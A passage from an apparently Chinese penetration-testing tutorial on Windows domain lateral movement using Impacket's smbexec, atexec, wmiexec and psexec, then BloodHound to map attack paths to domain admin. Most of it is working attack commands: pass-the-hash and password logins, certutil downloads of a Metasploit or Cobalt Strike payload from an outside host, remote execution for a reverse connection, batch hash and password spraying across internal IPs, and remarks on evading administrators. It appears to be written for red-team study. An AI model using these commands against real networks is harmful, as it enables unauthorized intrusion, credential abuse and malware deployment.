<p><img src="https://img-blog.csdnimg.cn/20201008212722166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在socks网络环境下(图中所示socks工具为proxifier)，使用域管账号NTLM hash认证对远程主机192.XXX.3.76执行命令，smbexec产生一个伪交互的cmd shell</p>
<pre><code class="prism language-c">smbexec<span class="token punctuation">.</span>exe <span class="token operator">-</span>hashes <span class="token punctuation">:</span><span class="token number">518</span>b98ad4178a53695dc997aa02d455c rootkit<span class="token operator">/</span>administrator@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008212736696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在socks网络环境下(图中所示socks工具为proxifier)，使用域管账号密码认证对远程主机192.168.3.76执行命令，smbexec产生一个伪交互的cmd shell</p>
<pre><code class="prism language-c">smbexec<span class="token punctuation">.</span>exe 
rootkit<span class="token operator">/</span>administrator<span class="token punctuation">:</span>admin<span class="token operator">!</span>@#<span class="token number">45</span>@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008212754945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在socks网络环境下(图中所示socks工具为proxifier)，使用local主机密码认证对远程主机192.168.3.76执行命令，smbexec产生一个伪交互的cmd shell</p>
<pre><code class="prism language-c">smbexec<span class="token punctuation">.</span>exe 
<span class="token punctuation">.</span><span class="token operator">/</span>administrator<span class="token punctuation">:</span>Win2008@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008212811312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在交互shell下，下载可执行程序(msf、cs等任意文件)</p>
<pre><code class="prism language-c">certutil <span class="token operator">-</span>urlcache <span class="token operator">-</span>split <span class="token operator">-</span>f http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10</span>x<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>x7<span class="token punctuation">:</span><span class="token number">8080</span><span class="token operator">/</span>lib8<span class="token punctuation">.</span>exe
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008212829103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2><a id="atexec_2218"></a>atexec</h2>
<p>atexec是通过windows计划任务执行远程命令，atexec是一个半交互的工具，即参数中添加需要在远程主机执行的命令，工具执行后即返回命令结果，适用于webshell下，也适用于其他网络环境。</p>
<p>某些情况下，当获取到webshell之后，发现该主机不可出外网，且无法创建内网代理，只能通过webshell进行内网渗透测试, 如下图，在蚁剑客户端运行atexec，在远程机器上执行任意命令</p>
<pre><code class="prism language-c">atexec<span class="token punctuation">.</span>exe <span class="token punctuation">.</span><span class="token operator">/</span>administrator<span class="token punctuation">:</span>Win2008@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> <span class="token string">"whoami"</span>

atexec<span class="token punctuation">.</span>exe <span class="token punctuation">.</span><span class="token operator">/</span>administrator<span class="token punctuation">:</span>Win2008@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> <span class="token string">"ipconfig"</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008212920792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
如果网络环境为已有内网socks代理环境，在socks网络环境下(图中所示socks工具为proxifier)，可使用密码认证对远程主机192.168.3.76执行命令</p>
<pre><code class="prism language-c">atexec<span class="token punctuation">.</span>exe <span class="token punctuation">.</span><span class="token operator">/</span>administrator<span class="token punctuation">:</span>Win2008@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> <span class="token string">"whoami"</span> 
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008212940209.png#pic_center" alt="在这里插入图片描述"><br>
在socks网络环境下(图中所示socks工具为proxifier)，使用NTLM hash认证对远程主机192.168.3.76执行命令</p>
<pre><code class="prism language-c">atexec<span class="token punctuation">.</span>exe <span class="token operator">-</span>hashes <span class="token punctuation">:</span>DF92E298362E3E180EC0EE7226AFB825 <span class="token punctuation">.</span><span class="token operator">/</span>administrator@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> <span class="token string">"whoami"</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008212956567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在socks网络环境下(图中所示socks工具为proxifier)，使用域管帐户密码认证对远程主机192.168.3.76执行命令，下载可执行程序(如msf、cs、其他任意文件，如密码获取、信息收集等)</p>
<pre><code class="prism language-c">atexec<span class="token punctuation">.</span>exe 
rootkit<span class="token operator">/</span>administrator<span class="token punctuation">:</span>admin<span class="token operator">!</span>@#<span class="token number">45</span>@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> <span class="token string">"certutil -urlcache -split -f http://10x.xx.xx.x7:8080/lib8.exe"</span> 
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008213018536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在上图下载可执行程序情况下，使用域管帐户密码认证远程执行该程序，使主机反向回连</p>
<pre><code class="prism language-c">atexec<span class="token punctuation">.</span>exe 
rootkit<span class="token operator">/</span>administrator<span class="token punctuation">:</span>admin<span class="token operator">!</span>@#<span class="token number">45</span>@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> <span class="token string">"lib8.exe"</span> 
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008213031646.png#pic_center" alt="在这里插入图片描述"><br>
在上图下载可执行程序情况下，在linux主机下，使用proxychains代理工具，使用atexec远程执行该程序，使主机反向回连<br>
<strong>注意此处，admin!@#45密码中的"!"需要转义，否则会报错。</strong></p>
<pre><code class="prism language-c">proxychains python atexec<span class="token punctuation">.</span>py rootkit<span class="token operator">/</span>administrator<span class="token punctuation">:</span>admin\<span class="token operator">!</span>@#<span class="token number">45</span>@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> <span class="token string">"lib8.exe"</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008213050359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
使用远程主机NTLM hash认证对远程主机192.168.3.76执行命令</p>
<pre><code class="prism language-c">atexec<span class="token punctuation">.</span>exe <span class="token operator">-</span>hashes 
<span class="token punctuation">:</span><span class="token number">518</span>b98ad4178a53695dc997aa02d455c rootkit<span class="token operator">/</span>administrator@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> <span class="token string">"whoami"</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008213105862.png#pic_center" alt="在这里插入图片描述"><br>
由此可以写一些简单bat脚本，如批量对内网机器遍历做hash传递验证、指定主机ntlm hash遍历验证、内网机器遍历做密码验证、指定主机密码遍历验证。</p>
<pre><code class="prism language-c">内网机器遍历做hash传递验证<span class="token punctuation">,</span>ips<span class="token punctuation">.</span>txt内容为内网ip，每段一条 
FOR <span class="token operator">/</span>F <span class="token operator">%</span><span class="token operator">%</span>i in <span class="token punctuation">(</span>ips<span class="token punctuation">.</span>txt<span class="token punctuation">)</span> <span class="token keyword">do</span> atexec<span class="token punctuation">.</span>exe <span class="token operator">-</span>hashes <span class="token punctuation">:</span>DF92E298362E3E180EC0EE7226AFB821 <span class="token punctuation">.</span><span class="token operator">/</span>administrator@<span class="token operator">%</span><span class="token operator">%</span>i  whoami 

指定主机ntlm hash遍历验证，hashes<span class="token punctuation">.</span>txt为已知ntlm hash内容，每段一条
FOR <span class="token operator">/</span>F <span class="token operator">%</span><span class="token operator">%</span>i in <span class="token punctuation">(</span>hashes<span class="token punctuation">.</span>txt<span class="token punctuation">)</span> <span class="token keyword">do</span> atexec<span class="token punctuation">.</span>exe <span class="token operator">-</span>hashes <span class="token operator">%</span><span class="token operator">%</span>i <span class="token punctuation">.</span><span class="token operator">/</span>administrator@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span>  whoami  

内网机器遍历做密码验证，passwords<span class="token punctuation">.</span>txt为已知密码内容，每段一条
FOR <span class="token operator">/</span>F <span class="token operator">%</span><span class="token operator">%</span>i in <span class="token punctuation">(</span>passwords<span class="token punctuation">.</span>txt<span class="token punctuation">)</span> <span class="token keyword">do</span> atexec<span class="token punctuation">.</span>exe  <span class="token punctuation">.</span><span class="token operator">/</span>administrator<span class="token punctuation">:</span><span class="token operator">%</span><span class="token operator">%</span>i@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span>  whoami 

指定主机密码遍历验证<span class="token punctuation">,</span>ips<span class="token punctuation">.</span>txt内容为内网ip，每段一条
FOR <span class="token operator">/</span>F <span class="token operator">%</span><span class="token operator">%</span>i in <span class="token punctuation">(</span>ips<span class="token punctuation">.</span>txt<span class="token punctuation">)</span> <span class="token keyword">do</span> atexec<span class="token punctuation">.</span>exe <span class="token punctuation">.</span><span class="token operator">/</span>administrator<span class="token punctuation">:</span>password123@<span class="token operator">%</span><span class="token operator">%</span>i  whoami  
</code></pre>
<h2><a id="wmiexec_2286"></a>wmiexec</h2>
<p>wmiexec是一个即有全交互也有半交互的远程命令执行工具，可运用于多种环境，包括webshell环境、rdp环境、socks环境等。</p>
<p>在webshell下，使用域管理员账号密码认证对远程主机192.168.3.76执行命令</p>
<pre><code class="prism language-c">wmiexec<span class="token punctuation">.</span>exe 
rootkit<span class="token operator">/</span>administrator<span class="token punctuation">:</span>admin<span class="token operator">!</span>@#<span class="token number">45</span>@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> whoami
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008213202941.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在socks网络环境下(图中所示socks工具为proxifier)，使用NTLM HASH认证对远程主机192.168.3.76执行命令</p>
<pre><code class="prism language-c">wmiexec<span class="token punctuation">.</span>exe <span class="token operator">-</span>hashes <span class="token punctuation">:</span>DF92E298362E3E180EC0EE7226AFB825 <span class="token punctuation">.</span><span class="token operator">/</span>administrator@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> whoami
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008213216366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在socks网络环境下(图中所示socks工具为proxifier)，使用NTLM HASH认证对远程主机192.168.3.76执行命令，wmiexec 产生一个伪交互的cmd shell</p>
<pre><code class="prism language-c">wmiexec<span class="token punctuation">.</span>exe <span class="token operator">-</span>hashes <span class="token punctuation">:</span>DF92E298362E3E180EC0EE7226AFB825 <span class="token punctuation">.</span><span class="token operator">/</span>administrator@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008213236204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在linux主机下，使用proxychains代理工具，使用wmiexec对远程主机192.168.3.76执行命令</p>
<pre><code class="prism language-c">proxychains python wmiexec<span class="token punctuation">.</span>py rootkit<span class="token operator">/</span>administrator<span class="token punctuation">:</span>admin\<span class="token operator">!</span>@#<span class="token number">45</span>@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> whoami
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020100821325247.png#pic_center" alt="在这里插入图片描述"><br>
在socks网络环境下(图中所示socks工具为proxifier)，使用帐号密码认证对远程主机192.168.3.76执行命令</p>
<pre><code class="prism language-c">wmiexec<span class="token punctuation">.</span>exe
<span class="token punctuation">.</span><span class="token operator">/</span>administrator<span class="token punctuation">:</span>Win2008@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> whoami
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008213306182.png#pic_center" alt="在这里插入图片描述"><br>
wmiexec也与atexec一样，可写脚本批量执行命令</p>
<h2><a id="psexec_2324"></a>psexec</h2>
<p>impacket套件内的psexec是一个即有全交互也有半交互的远程命令执行工具，可运用于多种环境，包括webshell环境、rdp环境、socks环境等。</p>
<p>psexec.exe始于微软的pstools套件， 用于管理员远程管理windows主机资产，在渗透测试中也经常用来对远程计算机执行命令。</p>
<p>与微软官方的psexec.exe做对比，官方psexec.exe执行远程命令会在远程主机创建一个PSEXEC的服务，并且命令执行后会一直存在，容易被管理人员发现并判断有入侵行为。impacket套件内的psexec，执行命令之后会删除对应的服务，隐蔽性更佳，而且impacket套件内的psexec支持PTH(哈希传递)。</p>
<p>与官方psexec相同，impacket套件内的psexec也支持"-c"参数，参数解释如下，即复制本地可执行文件到远程主机并执行</p>
<pre><code class="prism language-c"><span class="token operator">-</span>c pathname           copy the filename <span class="token keyword">for</span> later execution<span class="token punctuation">,</span> arguments are 
passed in the command option
</code></pre>
<p>下文所讲述的是impacket套件内的psexec使用方法</p>
<p>在linux主机下，使用proxychains代理工具，使用psexec.py远程执行命令</p>
<pre><code class="prism language-c">proxychains python psexec<span class="token punctuation">.</span>py <span class="token punctuation">.</span><span class="token operator">/</span>administrator<span class="token punctuation">:</span>Win2008@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008213427960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在psexec执行过程中，在远程主机192.168.3.76查看服务，发现创建了一个rwzH的服务</p>
<p><img src="https://img-blog.csdnimg.cn/20201008213439386.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>psexec执行完毕后，再在远程主机192.168.3.76查看服务，发现rwzH服务已不存在，psexec已自动删除自己创建的服务<br>
<img src="https://img-blog.csdnimg.cn/20201008213447585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在socks网络环境下(图中所示socks工具为proxifier)，使用NTLM HASH认证对远程主机192.168.3.76执行命令</p>
<pre><code class="prism language-c">psexec<span class="token punctuation">.</span>exe <span class="token operator">-</span>hashes <span class="token punctuation">:</span>DF92E298362E3E180EC0EE7226AFB825 <span class="token punctuation">.</span><span class="token operator">/</span>administrator@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> <span class="token string">"whoami"</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008213500513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在linux主机下，使用proxychains代理工具，使用psexec.py远程执行命令，注意密码内的"!"需要转义。</p>
<pre><code class="prism language-c">proxychains python psexec<span class="token punctuation">.</span>py rootkit<span class="token operator">/</span>administrator<span class="token punctuation">:</span>admin\<span class="token operator">!</span>@#<span class="token number">45</span>@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> whoami
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008213511658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
下面使用"-c"参数远程加载可执行程序，使目标主机反向回连。<br>
execute.exe放到与psexec.exe相同目录。<br>
首先创建exe可执行文件服务端。<br>
<img src="https://img-blog.csdnimg.cn/20201008213525337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在socks网络环境下(图中所示socks工具为proxifier)，使用帐户密码对远程主机192.168.3.76执行命令，使用"-c"参数。</p>
<pre><code class="prism language-c">psexec<span class="token punctuation">.</span>exe 
rootkit<span class="token operator">/</span>administrator<span class="token punctuation">:</span>admin<span class="token operator">!</span>@#<span class="token number">45</span>@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> <span class="token operator">-</span>c execute<span class="token punctuation">.</span>exe
</code></pre>
<p>在socks网络环境下(图中所示socks工具为proxifier)，使用NTLM HASH认证对远程主机192.168.3.76执行命令，使用"-c"参数。</p>
<pre><code class="prism language-c">psexec<span class="token punctuation">.</span>exe <span class="token operator">-</span>hashes <span class="token punctuation">:</span>DF92E298362E3E180EC0EE7226AFB825 <span class="token punctuation">.</span><span class="token operator">/</span>administrator@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> <span class="token operator">-</span>c execute<span class="token punctuation">.</span>exe
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008213544735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
如下图，目标主机已正常回连，由于目标主机是双网卡主机，显示内网ip为另外一块网卡的ip。<br>
<img src="https://img-blog.csdnimg.cn/20201008213554781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
如果执行的命令需要耗费比较长时间，或加载可执行程序，在webshell执行psexec.exe可能会收不到回显信息(webshell执行命令有超时时间)，所以建议把命令执行结果写到一个文件，然后查看文件内容即可。</p>
<pre><code class="prism language-c">psexec<span class="token punctuation">.</span>exe <span class="token operator">-</span>hashes <span class="token punctuation">:</span>DF92E298362E3E180EC0EE7226AFB825 <span class="token punctuation">.</span><span class="token operator">/</span>administrator@<span class="token number">192.168</span><span class="token number">.3</span><span class="token number">.76</span> <span class="token string">"netstat -an"</span> <span class="token operator">&gt;</span>log<span class="token punctuation">.</span>txt
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008213606249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
命令执行回显内容<br>
<img src="https://img-blog.csdnimg.cn/20201008213614215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
impacket套件内的psexec也与atexec一样，可写脚本批量执行命令。</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>mp<span class="token punctuation">.</span>weixin<span class="token punctuation">.</span>qq<span class="token punctuation">.</span>com<span class="token operator">/</span>s<span class="token operator">?</span>__biz<span class="token operator">=</span>MzI4MjA1MzkyNA<span class="token operator">==</span><span class="token operator">&amp;</span>mid<span class="token operator">=</span><span class="token number">2655304734</span><span class="token operator">&amp;</span>idx<span class="token operator">=</span><span class="token number">4</span><span class="token operator">&amp;</span>sn<span class="token operator">=</span><span class="token number">0</span>c49011632308cec35e5d978ff95ed0d<span class="token operator">&amp;</span>chksm<span class="token operator">=</span>f02fc055c75849430cba3a3b0a99851959c78fdb966992ddf5274857fe306144650ba0890429<span class="token operator">&amp;</span>scene<span class="token operator">=</span><span class="token number">21</span>
</code></pre>
<hr>
<h2><a id="102_bloodhound_2399"></a>10.2 bloodhound技术讲解</h2>
<h2><a id="_2401"></a>前言</h2>
<p>攻击者可以使用BloodHound轻松识别高度复杂的攻击路径。防御者可以使用它来识别和消除那些相同的攻击路径。蓝队和红队都可以使用BloodHound轻松深入了解Active Directory环境中的权限关系。</p>
<p>BloodHound分为两部分，一部分是收集器，通过不同的API调用收集图形所需的信息；另一部分是将集合的信息导入Neo4j数据库中，进行展示分析。</p>
<h2><a id="_2407"></a>工具使用</h2>
<p>环境：</p>
<p>kali 2019 vm虚拟机</p>
<p>安装：</p>
<p>apt-get install bloodhound</p>
<p>安装完毕后启动Neo4j和bloodhound</p>
<p>neo4j console</p>
<p>bloodhound</p>
<p>访问：</p>
<pre><code class="prism language-c">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">7474</span>修改初始密码，然后登陆bloodhound
</code></pre>
<p><strong>联动cobaltstrike</strong></p>
<p>可以通过sharpbound.exe和ps1单独使用（execute-assembly、powershell-import）。<br>
导入插件，快速导出并下载bloodhound的json文件。<br>
<img src="https://img-blog.csdnimg.cn/2020100821392159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
选择任意可用选项<br>
<img src="https://img-blog.csdnimg.cn/20201008213932909.png#pic_center" alt="在这里插入图片描述"><br>
使用powerpick<br>
<img src="https://img-blog.csdnimg.cn/20201008213941987.png#pic_center" alt="在这里插入图片描述"><br>
在view–&gt;download找到下载的文件<br>
<img src="https://img-blog.csdnimg.cn/20201008213950171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
导入zip后就可以通过各种关系寻找路线攻击域管或者某台特定机器</p>
<p>寻找攻击域管的最短路径：<br>
<img src="https://img-blog.csdnimg.cn/20201008214004384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>由于本地搭建的域环境没有过多的关联信息，所以不能很好看出各台机器的关系逻辑。</p>
<p>其他环境效果图：<img src="https://img-blog.csdnimg.cn/20201008214011581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
查找具有DCSync权限的主体</p>
<p><img src="https://img-blog.csdnimg.cn/20201008214023534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>通过使用该工具，可以在攻击内网的时候有一个明确的路线，大致了解哪些机器及用户的权限是存在价值的，还可以通过当前所获取的权限去判断我们下一步应该去攻击哪些机器，当前的权限是否又与哪些机器有着session交互。</p>
<p><strong>使用技巧</strong></p>
<p>如果你不想过多了解bloodhound对运行机制，不需要自己编写语法查询，只用bloodhound提供的默认ui显示。那么只需要认识几个图形所代表的意义及一些使用技巧：</p>
<p>绿色用户头像：用户<br>
三个黄色头像：用户组<br>
红色小电脑：计算机<br>
绿色小地球：域</p>
<p><strong>默认提供的ui查询：</strong></p>
<pre><code class="prism language-c">Find all Domain Admins 查找所有域管理员

Find Shortest Paths to Domain Admins  查找域管理员的最短路径

Find Principals with DCSync Rights查找具有DCSync权限的主体

Users with Foreign Domain Group Membership 具有外域组成员身份的用户

Groups with Foreign Domain Group Membership  具有外域组成员身份的组

Map Domain Trusts域信任映射图

Shortest Paths to Unconstrained Delegation Systems  不受约束的委派系统的最短路径

Shortest Paths from Kerberoastable Users 来自Kerberoastable用户的最短路径

Shortest Paths to Domain Admins from Kerberoastable Users  可通过Kerberoastable用户访问域管理员的最短路径

Shortest Path from Owned Principals  已拥有权限最短路径

Shortest Paths to Domain Admins from Owned Principals 已拥有权限到域管理员的最短路径

Shortest Paths to High Value Targets高价值目标的最短路径
</code></pre>
<p><strong>两个关系中的联系解读：</strong></p>
<p>鼠标移动到路径并出现闪光时，右键–&gt;HELP<br>
<img src="https://img-blog.csdnimg.cn/20201008214104825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
出现该关系的释义<br>
<img src="https://img-blog.csdnimg.cn/2020100821411355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
通过 <strong>点</strong> 进行关系关联：</p>
<p>如下图，通过点击企业管理员组将会利用闪光列出3条相关联的信息路径。</p>
<p><img src="https://img-blog.csdnimg.cn/20201008214130129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
以高价值目标的最短路径举例进行分析</p>
<p>当选择高价值目标的最短路径UI进行分析（选择其他UI使用方式一样），可以重点关注用户（绿色头像）、计算机（红色小电脑）。当用鼠标指向这两个单位时，会以高亮显示体现出具体的攻击路径。简而言之：</p>
<pre><code class="prism language-c"><span class="token number">1.</span>对高亮攻击路径中的所有用户分析
<span class="token number">2.</span>对高亮攻击路径中的所有计算机进行分析
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008214149241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
找到关键计算机或者关键用户时，可以右键设置最短路径到此处，查询可以获取该用户权限的路径信息。</p>
<p>发现从exchange计算机可以获取该用户权限<br>
<img src="https://img-blog.csdnimg.cn/20201008214201260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
如同这样，可以遍历默认提供的ui查询中，获取到关键的用户、计算机以及获取它们的相关路径，可以很好的辅助内网渗透中的横向、纵向权限获取。</p>
<p><strong>路径设置</strong></p>
